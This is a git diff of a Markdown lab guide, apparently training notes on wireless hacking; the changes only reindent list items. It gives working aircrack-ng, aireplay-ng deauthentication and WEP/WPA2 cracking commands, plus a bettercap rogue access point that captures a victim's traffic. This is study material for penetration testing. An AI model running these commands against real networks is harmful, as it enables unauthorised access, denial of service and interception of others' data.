@@ -19,18 +19,18 @@ Wireless communication at the physical layer leads to fundamental changes. Wirel
 ## Tasks
 
 #### 1. Footprint a Wireless Network
-    - Find Wi-Fi networks using NetSurveyor
+   - Find Wi-Fi networks using NetSurveyor
 
 #### 2. Perform Wireless Traffic Analysis
-    - Find Wi-Fi networks and sniff packets using wash and Wireshark
+   - Find Wi-Fi networks and sniff packets using wash and Wireshark
 
 #### 3. Perform Wireless Attacks
-    - Find hidden SSIDs using Aircrack-ng
-    - Crack WEP network using Wifiphisher
-    - Crack WEP network using Aircrack-ng
-    - Crack a WPA Network using Fern Wifi Cracker
-    - Crack a WPA2 Network using Aircrack-ng
-    - Create a Rogue Access Point to Capture Data Packets
+   - Find hidden SSIDs using Aircrack-ng
+   - Crack WEP network using Wifiphisher
+   - Crack WEP network using Aircrack-ng
+   - Crack a WPA Network using Fern Wifi Cracker
+   - Crack a WPA2 Network using Aircrack-ng
+   - Create a Rogue Access Point to Capture Data Packets
 
 ---
 ### 1. Footprint a Wireless Network
@@ -74,7 +74,7 @@ Wireless communication at the physical layer leads to fundamental changes. Wirel
 
 
 **Additional Tools:**
-    - Explore other Wi-Fi discovery tools like inSSIDer Plus (https://www.metageek.com), Wi-Fi Scanner (https://lizardsystems.com), Acrylic Wi-Fi Home (https://www.acrylicwifi.com), WirelessMon (https://www.passmark.com), and Ekahau HeatMapper (https://www.ekahau.com).
+   - Explore other Wi-Fi discovery tools like inSSIDer Plus (https://www.metageek.com), Wi-Fi Scanner (https://lizardsystems.com), Acrylic Wi-Fi Home (https://www.acrylicwifi.com), WirelessMon (https://www.passmark.com), and Ekahau HeatMapper (https://www.ekahau.com).
 
 ### 2. Perform Wireless Traffic Analysis
 
@@ -100,15 +100,15 @@ Wireless communication at the physical layer leads to fundamental changes. Wirel
    - Results will display discovered Wi-Fi access points.
 
 - Capture Wi-Fi Packets using Wireshark:
-    - Open Wireshark in the terminal using `wireshark`.
-    - In Wireshark, double-click the wireless network interface (e.g., wlan0mon).
+   - Open Wireshark in the terminal using `wireshark`.
+   - In Wireshark, double-click the wireless network interface (e.g., wlan0mon).
 
 - Start Packet Capture:
-    - Observe Wireshark capturing 802.11 labeled packets.
-    - Captured packets include information like source, destination, protocol, etc.
+   - Observe Wireshark capturing 802.11 labeled packets.
+   - Captured packets include information like source, destination, protocol, etc.
 
 **Other Traffic Analyzers:**
-    - Other Wi-Fi traffic analyzers like [AirMagnet WiFi Analyzer PRO](https://www.netally.com), [SteelCentral Packet Analyzer](https://www.riverbed.com), [Omnipeek Network Protocol Analyzer](https://www.liveaction.com), [CommView for Wi-Fi](https://www.tamos.com), and [Capsa Portable Network Analyzer](https://www.colasoft.com) can also be explored.
+   - Other Wi-Fi traffic analyzers like [AirMagnet WiFi Analyzer PRO](https://www.netally.com), [SteelCentral Packet Analyzer](https://www.riverbed.com), [Omnipeek Network Protocol Analyzer](https://www.liveaction.com), [CommView for Wi-Fi](https://www.tamos.com), and [Capsa Portable Network Analyzer](https://www.colasoft.com) can also be explored.
 
 ### 3. Perform Wireless Attacks
 
@@ -146,18 +146,18 @@ Wireless communication at the physical layer leads to fundamental changes. Wirel
 
 
 - Deauthentication Attack:
-    - Use `aireplay-ng -0 11 -a <BSSID> -c <ClientMAC> wlan0mon` to generate de-authentication packets.
-    - e.g., use `aireplay-ng -0 11 -a 54:37:BB:68:88:F9 -c 20:A6:0C:30:23:D3 wlan0mon` to generate de-authentication packets.
+   - Use `aireplay-ng -0 11 -a <BSSID> -c <ClientMAC> wlan0mon` to generate de-authentication packets.
+   - e.g., use `aireplay-ng -0 11 -a 54:37:BB:68:88:F9 -c 20:A6:0C:30:23:D3 wlan0mon` to generate de-authentication packets.
 
-        - `-0`: Activates deauthentication mode.
-        - `11`: Number of deauthentication packets to be sent.
-        - `-a`: Sets the access point MAC address.
-        - `-c`: Sets the destination MAC address.
-        - `wlan0mon`: Wireless interface.
+      - `-0`: Activates deauthentication mode.
+      - `11`: Number of deauthentication packets to be sent.
+      - `-a`: Sets the access point MAC address.
+      - `-c`: Sets the destination MAC address.
+      - `wlan0mon`: Wireless interface.
 
 - Fake Authentication:
-    - Switch back to the terminal with airodump-ng.
-    - Observe the hidden SSID revealed under ESSID.
+   - Switch back to the terminal with airodump-ng.
+   - Observe the hidden SSID revealed under ESSID.
 
 **Note:**
 - In real attacks, this information is used to crack encryption and obtain the access key.
@@ -208,18 +208,18 @@ Wireless communication at the physical layer leads to fundamental changes. Wirel
    - Type `airodump-ng wlan0mon` to display access points and connected clients.
 
 - **Filter WEP Networks:**
-    - Optionally, use `airodump-ng wlan0mon --encrypt wep` to display only WEP networks.
+   - Optionally, use `airodump-ng wlan0mon --encrypt wep` to display only WEP networks.
 
 - **Capture Initialization Vectors (IVs):**
-    - Execute `airodump-ng --bssid [Target_BSSID] -c [Channel_Number] -w WEPcrack wlan0mon`.
+   - Execute `airodump-ng --bssid [Target_BSSID] -c [Channel_Number] -w WEPcrack wlan0mon`.
 
 - **Generate ARP Traffic:**
-    - In a new terminal, type `aireplay-ng -3 -b [Target_BSSID] -h [Client_BSSID] wlan0mon`.
-    - Wait for sufficient ARP packets, then press Ctrl+C on both terminals.
+   - In a new terminal, type `aireplay-ng -3 -b [Target_BSSID] -h [Client_BSSID] wlan0mon`.
+   - Wait for sufficient ARP packets, then press Ctrl+C on both terminals.
 
 - **Crack WEP Key:**
-    - Launch `aircrack-ng WEPcrack-01.cap` to recover the WEP key.
-    - Connect to the target access point using the cracked WEP key.
+   - Launch `aircrack-ng WEPcrack-01.cap` to recover the WEP key.
+   - Connect to the target access point using the cracked WEP key.
 
 **Wireless Attacks:**
 Wireless attacks involve exploiting vulnerabilities in wireless networks. Common attacks include eavesdropping, packet sniffing, denial-of-service (DoS), Man-in-the-Middle (MitM), and cracking encryption protocols like WEP, WPA, or WPA2. Tools like Aircrack-ng, Wireshark, and airmon-ng are commonly used for wireless penetration testing. Understanding these attacks is crucial for securing wireless infrastructures.
@@ -264,7 +264,7 @@ The implementation of these features results in more robust encryption and authe
    - After the completion of the attack, the cracked WPA key will be displayed.
 
 - **Verify Cracked Key:**
-    - If the Attack Panel window closes, relaunch Fern Wifi Cracker and click 'Key Database' to verify the acquired key.
+   - If the Attack Panel window closes, relaunch Fern Wifi Cracker and click 'Key Database' to verify the acquired key.
 
 - Wireless attacks exploit vulnerabilities in wireless networks, including WEP and WPA encryption protocols. Fern Wifi Cracker facilitates the cracking of WPA keys, enhancing security testing and network penetration.
 
@@ -286,14 +286,14 @@ The implementation of these features results in more robust encryption and authe
    - Use `airodump-ng --bssid 54:37:BB:68:88:F9 -c 11 -w <target> wlan0mon` to capture packets.
 
 - **Send De-authentication Packets:**
-    - Open a new terminal and type `aireplay-ng -0 11 -a 54:37:BB:68:88:F9 -c wlan0mon` multiple times.
+   - Open a new terminal and type `aireplay-ng -0 11 -a 54:37:BB:68:88:F9 -c wlan0mon` multiple times.
 
 - **Capture WPA Handshake:**
-    - Switch back to the terminal running `airodump-ng` and capture the WPA handshake.
+   - Switch back to the terminal running `airodump-ng` and capture the WPA handshake.
 
 - **Crack WPA2 Key:**
-    - aircrack-ng -a2 54:37:BB:68:88:F9 -w password.txt <target.cap>
-    - The cracked key will be displayed under "KEY FOUND!"
+   - aircrack-ng -a2 54:37:BB:68:88:F9 -w password.txt <target.cap>
+   - The cracked key will be displayed under "KEY FOUND!"
 
 **Additional Tools:**
 
@@ -311,42 +311,42 @@ The implementation of these features results in more robust encryption and authe
 
 - Install required packages by running the following command in the terminal:
 
-    ```bash
-    sudo apt-get install haveged hostapd git util-linux procps iproute2 iw dnsmasq iptables bettercap
-    ```
+   ```bash
+   sudo apt-get install haveged hostapd git util-linux procps iproute2 iw dnsmasq iptables bettercap
+   ```
 
 - Navigate to the [create_ap](https://github.com/oblique/create_ap) repository and install it:
 
-    ```bash
-    cd create_ap
-    make install
-    ```
+   ```bash
+   cd create_ap
+   make install
+   ```
 
 - Identify the wireless interface:
 
-    ```bash
-    ip a
-    ```
+   ```bash
+   ip a
+   ```
 
 - Launch the rogue access point:
 
-    ```bash
-    create_ap <wireless-interface> eth0 Freelnternet
-    ```
+   ```bash
+   create_ap <wireless-interface> eth0 Freelnternet
+   ```
 
-    (Replace `<wireless-interface>` with your wireless interface)
+   (Replace `<wireless-interface>` with your wireless interface)
 
 - On your mobile device, connect to the Freelnternet access point.
 
 - Capture traffic from the victim's device:
-    ```bash
-    sudo bettercap -X -I <wireless-interface> -S NONE --proxy --no-discovery
-    ```
-    - `-X`: Sniffing enabled
-    - `-I`: Interface specified
-    - `-S`: ARP spoofing set to NONE
-    - `--proxy`: HTTP proxy enabled
-    - `--no-discovery`: Disable client discovery
+   ```bash
+   sudo bettercap -X -I <wireless-interface> -S NONE --proxy --no-discovery
+   ```
+   - `-X`: Sniffing enabled
+   - `-I`: Interface specified
+   - `-S`: ARP spoofing set to NONE
+   - `--proxy`: HTTP proxy enabled
+   - `--no-discovery`: Disable client discovery
 
 - Observe captured traffic, switch to the mobile device, and browse a website (e.g., http://testphp.vulnweb.com/login.php).
 
